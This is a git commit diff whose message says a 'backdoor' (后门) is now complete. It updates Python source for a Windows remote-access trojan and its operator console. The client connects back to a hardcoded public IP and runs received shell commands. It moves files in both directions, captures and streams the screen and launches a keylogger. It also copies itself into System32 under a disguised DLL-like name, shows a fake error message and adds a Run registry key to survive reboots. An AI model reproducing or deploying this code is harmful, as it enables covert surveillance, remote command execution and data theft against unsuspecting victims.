3cfbc793f4294537aed2937d4381aebf9f5e166c
m8v8m <mv88.tw@gmail.com>
2025-02-16 17:34:16 +0800

    完结
    至此，后门全部编写完成

--- 后门/target.py
+++ 后门/target.py
@@ -3,65 +3,64 @@ from multiprocessing import Process
 from time import sleep
 import win32gui
 import win32ui
-import win32con
-import win32api
- 
-
+import win32con,sys
+import numpy as np
+import win32api,cv2,time
+from PIL import ImageGrab
+from io import BytesIO
+import winreg
 
 def screenshots():
-    hdesktop = win32gui.GetDesktopWindow()
-    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
-    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
-    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
-    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
-    desktop_dc = win32gui.GetWindowDC(hdesktop)
-    img_dc = win32ui.CreateDCFromHandle(desktop_dc)
-    mem_dc = img_dc.CreateCompatibleDC()
-    screenshot = win32ui.CreateBitmap()
-    screenshot.CreateCompatibleBitmap(img_dc, width, height)
-    mem_dc.SelectObject(screenshot)
-    mem_dc.BitBlt((0, 0), (width, height), img_dc, (0, 0), win32con.SRCCOPY)
-    screenshot.SaveBitmapFile(mem_dc, 'screenshot.bmp')
-    mem_dc.DeleteDC()
-    win32gui.DeleteObject(screenshot.GetHandle())
+    im = ImageGrab.grab()#无参数默认全屏截屏
+    im.save('screenshot.jpeg',quality=40)
 
 def get_process_pid(process_name):
     for proc in psutil.process_iter(['pid', 'name']):
         if proc.info['name'] == process_name:
             return proc.info['pid']
     return None
-server_ip='192.168.10.60'
+server_ip='113.45.181.202'
 port=6369
+
 def share_screen():
-    from PIL import ImageGrab
-    from io import BytesIO
-    width = win32api.GetSystemMetrics(win32con.SM_CXSCREEN)
-    height = win32api.GetSystemMetrics(win32con.SM_CYSCREEN)
-    # 压缩时，大小变为一半
-    w = width // 2
-    h = height // 2
+
+    p = ImageGrab.grab()#获得当前屏幕
+    quality = 80  # 图像的质量
+    encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), quality]
     while True:
-        img = ImageGrab.grab(bbox=(0, 0, width, height))
-        img.thumbnail((w, h))
-        output_buffer = BytesIO() 
-        img.save(output_buffer, format='JPEG', quality=50)
-        frame = output_buffer.getvalue()  # 获取二进制数据
-        s.sendto(frame, (server_ip, port))
-        sleep(0.05)  # 加点延时更稳定。
+        im = ImageGrab.grab()
+        imm=cv2.cvtColor(np.array(im), cv2.COLOR_RGB2BGR)#转为opencv的BGR格式
+        imm = cv2.resize(imm, (1300, 900))#缩放
+        img_encode = cv2.imencode(".jpg", imm, encode_param)[1]
+        data_encode = np.array(img_encode)
+        str_encode = data_encode.tostring()
+
+        print("发生的数据大小",len(str_encode))
+        #输入要发送的信息
+        sendmsg="startsee"
+        #yz_data=s.recv(1024)
+        #print("line 40 yz_data is:",yz_data)
+        #if yz_data==b"249see":
+        #向服务器发送消息
+            #print("验证通过发送数据一次")
+        s.send(str_encode)
+        time.sleep(0.5)
+    print("see disconnect")
+
 
 def key_lis():
-    print("im run ")
+    #print("im run ")
     subprocess.run(r"C:\Users\Administrator\Desktop\door\key_listen.exe")
 def start_client(s):
-    s.send(bytes("sect success", encoding="gbk"))
+    s.send(bytes("connect success", encoding="gbk"))
     while True:
-        data2="无效命令\n"
         try:
+
             data = s.recv(1024)
-            print(data)
+            #print("第一段数据：",data)
             data = str(data, encoding="gbk")
             if len(data)<=0 or data=="\n" or data=="\r" or data=="":
-                print("empty data")
+                #print("empty data")
                 data2="你发送了空数据"
                 s.close()
                 break
@@ -69,13 +68,18 @@ def start_client(s):
                 data2="command success"
             elif (data[0]=="$"):
                 data=data.replace("$","")
-                f = os.popen(data)
-                data2 = f.read()
-                s.send(bytes(data2, encoding="gbk"))
+                data = subprocess.run(data,stdout=subprocess.PIPE,shell=True,encoding='gbk')
+                #print(data.returncode)
+                if data.returncode != 0:
+                    data="命令输入错误"
+                    s.send(bytes(data,encoding="gbk"))
+                else:
+                    #print(data.stdout)
+                    s.send(bytes(data.stdout,encoding="gbk"))
             elif(data[0]=="@"):
                 extend_func=data.replace("@","")
                 extend_func=extend_func.split(" ",1)
-                print(extend_func)
+                #print(extend_func)
                 if extend_func[0]=="keylisten":
                     threading.Thread(target=key_lis).start()
                     s.send(bytes("ojbk", encoding="gbk"))
@@ -86,74 +90,138 @@ def start_client(s):
                 if extend_func[0]=="upload":
                     s.send(bytes("ok", encoding="gbk"))
                     recv_file=data.replace("upload ","")
-                    print("will recv file<----"+recv_file)
+                    #print("will recv file<----"+recv_file)
                     recvd_size = 0 
                     file_name=os.path.basename(recv_file)
-                    fp = open(r"./"+file_name, 'wb')#ab追加 wb覆盖
-                    file_size=int(s.recv(1024))
-                    print("recv size:",file_size)
-                    while not recvd_size == file_size:
-                        if file_size - recvd_size > 1024:
-                            data = s.recv(1024)
-                            recvd_size += len(data)
-                        else:
-                            data = s.recv(file_size - recvd_size)
-                            recvd_size = file_size
-                            fp.write(data)
-                    fp.close()
-                    s.send(bytes("success", encoding="gbk"))
-                    s.send(bytes("command success", encoding="gbk"))
+                    
+                    #print("接受文件保存的路径是：","./"+file_name)
+                    file_size=s.recv(1024)
+                    #print("86行file_size的值是",file_size)
+                    if file_size!=b"no_file":
+                        fp = open("./"+file_name, 'ab')#ab追加 wb覆盖
+                        if file_size.isdigit()==True:
+                            file_size=int(file_size)
+                            while not recvd_size == file_size:
+
+                                #print("recv size:",file_size)
+                                if file_size - recvd_size > 1024:
+                                    data = s.recv(1024)
+                                    recvd_size += len(data)
+                                else:
+                                    data = s.recv(file_size - recvd_size)
+                                    recvd_size = file_size
+                                fp.write(data)
+                                #print(data)
+                                s.send(bytes("up!up!", encoding="gbk"))  
+                            fp.close()
+                            s.send(bytes("success", encoding="gbk"))
+                        s.send(bytes("command success", encoding="gbk"))
                 if extend_func[0]=="recv":
                         send_file=data.replace("@recv ","")
-                        print("you try upload file--->"+send_file)
+                        #print("you try upload file--->"+send_file)
                         if os.path.isfile(send_file):
                             redat=s.recv(1024)
-                            print(redat)
-                            if redat==b'ok':
-                                print("start send")
-                                file_quality=str(os.stat(send_file).st_size).encode("gbk")
-                                print("file size:",file_quality)
-                                s.send(file_quality)
-                                fp = open(send_file, 'rb')
-                                while 1:
-                                    data = fp.read(1024)
-                                    if not data and s.recv(1024)==b'success':
-                                        print("send succes")
-                                        fp.close()
-                                        break
-                                    s.send(data)
+                            send_size=0
+                            #print("recv file 返回数据：",redat)
+                            if redat==b'startrecv':
+                                #print("start send")
+                                file_quality=int(os.stat(send_file).st_size)
+                                #print("file size:",file_quality)
+                                s.send(bytes(str(file_quality),encoding="gbk"))
+                                #fp = open(send_file, 'rb')
+                                with open(send_file,'rb') as f:
+                                    # 按每一段分割文件上传
+                                    for i in f:
+                                        s.send(i)
+                                        # 等待接收完成标志.
+                                        #print("一段数据：\n\n")
+                                        print(i)
+                                        # 判断是否真正接收完成
+                                        if s.recv(1024) == b'success':
+                                            break
                             else:
                                 print("target return other message")
-                        else:s.send("no file")
+                        else:
+                            data2="文件不存在"
+                            #print(data2)
+                            s.send(bytes("no_file",encoding="gbk"))
                 if extend_func[0]=="screenshots":
                     screenshots()
                     s.send(bytes("ojbk", encoding="gbk"))
-                if extend_func[0]=="see":#未验证
+                if extend_func[0]=="see":
                     share_screen()
             else:
-                s.send(bytes(data2, encoding="gbk"))
+                data = s.recv(1024)
+                #print("132行返回的数据是：",data)
+                s.send(bytes("命令结束", encoding="gbk"))
 
 
-#        except sectionResetError:
-#            print("远程主机强迫关闭了一个现有的连接。")
- #           sleep(1)
- #           s.close()
- #           break
-        except OSError:
-            print("OSError: [WinError 10038] 在一个非套接字上尝试了一个操作。")
+        except ConnectionResetError:
+            #print("远程主机强迫关闭了一个现有的连接。ConnectionResetError")
             sleep(1)
             s.close()
             break
-        sleep(1)
-    print(999)
-while 1:
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        print("ret connect...")
-        s.connect((server_ip, port))
-        print ("[+] new sect" , server_ip + ":", port)
-        start_client(s)
-        #start_new_thread(clientthread, (s,))
-        s.close()
-    except:
-        sleep(0.5)
+        except ConnectionRefusedError:
+            
+            #print("对方断开了连接。ConnectionRefusedError")
+            sleep(1)
+            s.close()
+            break
+        except ConnectionAbortedError:
+            #print("你主动断开了连接。ConnectionAbortedError")
+            sleep(1)
+            s.close()
+            break
+        #except OSError:
+        #    print("OSError: [WinError 10038] 在一个非套接字上尝试了一个操作。")
+        #    sleep(1)
+        #    s.close()
+        #    break
+        #except:data2="无效命令\n"
+            sleep(1)
+    #print("start_client退出循环一次")
+main_exe="C:\\Windows\\System32\\msvcp249.exe"
+try_start=0
+
+def check_exe():
+    for process in psutil.process_iter(['name']):
+        if process.info['name'] == "msvcp249.exe":
+            print(process.info['name'])
+            return True
+if check_exe()!=True:
+            if os.path.isfile(main_exe):
+                print("文件存在未运行，启动一次")
+                os.system("start "+main_exe)
+                #os.system(main_exe)
+
+            else:
+                win32api.MessageBox(0, "无法启动程序 不是有效的win32程序", "提醒", win32con.MB_OK)
+                with open (sys.argv[0],'rb')as f:#自我复制
+                    with open(main_exe,'ab') as target:
+                        for i in f:
+                            target.write(i)
+                            #print("复制一次")
+                            target.flush()
+                os.system("start "+main_exe)
+                #os.system(main_exe)
+                print("文件部署成功，启动")
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",winreg.KEY_SET_VALUE, winreg.KEY_ALL_ACCESS|winreg.KEY_WRITE|winreg.KEY_CREATE_SUB_KEY)
+                winreg.SetValueEx(key, "249", 0, winreg.REG_SZ, "C:\\Windows\\System32\\msvcp249.exe")
+                winreg.CloseKey(key)
+                sys.exit()
+else:
+    print("文件存在并且已经启动")
+    while 1:
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    #print("ret connect...")
+                    s.connect((server_ip, port))
+                    #print ("[+] new sect" , server_ip + ":", port)
+                    start_client(s)
+                    #start_new_thread(clientthread, (s,))
+                    s.close()
+                #except:
+                except ConnectionRefusedError:
+                        #print("对方断开了连接。ConnectionRefusedError")
+                        sleep(1)
+                        s.close()
--- 后门/we.py
+++ 后门/we.py
@@ -1,6 +1,8 @@
 
 import socket
-import os,time,struct
+import os,time,struct,cv2
+
+import numpy as np
 #from pynput.keyboard import Key, Controller,Listener
 ip = "" 
 port = 6369  # 设置端口
@@ -19,35 +21,64 @@ while 1:
     s.listen(10)
     conn, addr = s.accept()
     print("新的连接：",addr)
+    
     while True:
         try:
-            recv_data=str((conn.recv(1024)),encoding="gbk")
-            if recv_data=="ojbk":print("命令执行完毕")
-            else:print("[target]:",recv_data)
+            conn.send(bytes("249", encoding="gbk")) 
+            datas=conn.recv(1024)
+            print("接收到的第一份数据：",datas,"大小：",len(datas))
+            recv_data=str(datas,encoding="gbk")
+            if recv_data=="ojbk":
+                print("命令执行完毕")
+            else:
+                print("[target]:",recv_data)
+            if len(datas)<=0 or datas=="\n" or datas=="\r" or datas=="":
+                print("接收到了空数据")
             data=input("command:")
             cmdline=data.split(" ",1)
+
             conn.send(bytes(data, encoding="gbk"))
             if cmdline[0]=="@recv":
                     recv_file=os.path.basename(data.replace("@recv ",""))
                     print("recv file<----"+recv_file)
-                    conn.send(bytes("ok", encoding="gbk"))
-                    
+                    conn.send(bytes("startrecv", encoding="gbk"))
+                    print("开始接受")
                     recvd_size = 0 
-                    fp = open(r"./"+recv_file+".bak", 'ab')#ab追加 wb覆盖
-                    file_size=int(conn.recv(1024))
-                    print("recv size:",file_size)
-                    while not recvd_size == file_size:
-                        if file_size - recvd_size > 1024:
-                            data = conn.recv(1024)
-                            recvd_size += len(data)
-                        else:
-                            data = conn.recv(file_size - recvd_size)
-                            recvd_size = file_size
-                            print(data)
-                            fp.write(data)
-                    fp.close()
-                    conn.send(bytes("success", encoding="gbk"))
-                    conn.send(bytes("ojbk", encoding="gbk"))
+
+                    file_size=conn.recv(1024)
+                    print("43行file_size的值是",file_size)
+                    print(file_size.isdigit())
+                    if file_size.isdigit()==True:
+
+                        if file_size!=b"no_file":
+
+                            file_size=int(file_size)
+                            print("45行：file_size",file_size)
+                            print("46行：fp",os.path)
+                            fp = open("./"+recv_file+".bak", 'ab')#ab追加 wb覆盖
+
+                            print("recv size:",file_size)
+                            while not recvd_size == file_size:
+                                print("recvd_size的值：",recvd_size,"file_size的值：",file_size)
+                                if file_size - recvd_size > 1024:
+                                    data = conn.recv(1024)
+                                    recvd_size += len(data)
+                                else:
+                                    data = conn.recv(file_size - recvd_size)
+                                    recvd_size = file_size
+                                print(data)
+                                fp.write(data)
+                                conn.send(bytes("up!up!", encoding="gbk"))        
+                            print("文件接受关闭")
+                            fp.close()
+                            conn.send(bytes("success", encoding="gbk"))
+                        conn.send(bytes("ojbk", encoding="gbk"))
+                    else:
+                        print("文件传输错误，主动断开")
+
+                        conn.close() 
+                        s.close()
+                        break
             elif  cmdline[0]=="@upload":
                     send_file=data.replace("@upload ","")
                     print("you try upload file--->"+send_file)
@@ -61,36 +92,64 @@ while 1:
                             file_quality=str(os.stat(send_file).st_size).encode("gbk")
                             print(file_quality)
                             conn.send(file_quality)
-                            fp = open(send_file, 'rb')
-                            while 1:
-                                data = fp.read(1024)
-                                if not data and conn.recv(1024)==b'success':
-                                    print("send succes")
-                                    fp.close()
-                                    break
-                                conn.send(data)
-                            
+                            with open(send_file,'rb') as f:
+                                    # 按每一段分割文件上传
+                                    for i in f:
+                                        conn.send(i)
+                                        # 等待接收完成标志.
+                                        print("一段数据：\n\n")
+                                        print(i)
+                                        # 判断是否真正接收完成
+                                        if conn.recv(1024) == b'success':
+                                            break
                         else:
                             print("target return other message")
+                    else:
+                            data2="文件不存在"
+                            print(data2)
+                            conn.send(bytes("no_file",encoding="gbk"))
             elif cmdline[0]=="@see":#未验证
-                import matplotlib.pyplot as plt
-                import matplotlib.image as image
-                from io import BytesIO
-                plt.clf()  # 清除上一幅图像
-                data, addr = sock.recvfrom(65536)  # 接受数值大一点，防止被撑爆
-                img = BytesIO(data)
-                img = image.imread(img, format='jpeg')
-                plt.imshow(img)
-                plt.pause(0.05)  # 暂停0.05秒 这一句是实现动态更新的
-                plt.ioff()  # 关闭画图的窗口
+                try:
+                    print("start remote desktop")
+                    while True:
+                        conn.send(bytes("249see", encoding="gbk")) 
+                        print("fa送一次数据")
+                        # 接受客户端消息,设置一次最多接受10240字节的数据
+                        recv_msg = conn.recv(102400)
+                        # 把接收到的东西解码
+                        print("115行recv_msg大小：",len(recv_msg))
+                        msg = np.frombuffer(recv_msg, np.uint8)
+                        print("117 line size of msg:",len(msg))
+                        img_decode = cv2.imdecode(msg, cv2.IMREAD_COLOR)
+                        
+
+                        cv2.imshow(str(addr), img_decode)
+
+                        cv2.waitKey(100)
+                    s.send(bytes("249", encoding="gbk")) 
+                    print("see disconnect")
+                except:
+                    conn.close() 
+                    s.close()
+                    break
 
 
-        except :
 
-            time.sleep(1)
+        except ConnectionAbortedError:
+            print("连接已断开")
+#
+      #      time.sleep(1)
             conn.close() 
             s.close()
             break
-        time.sleep(1)
+        except ConnectionResetError:
+            print("对方断开了连接。ConnectionRefusedError")
+#
+      #      time.sleep(1)
+            conn.close() 
+            s.close()
+            break
+
+
     time.sleep(3)
 
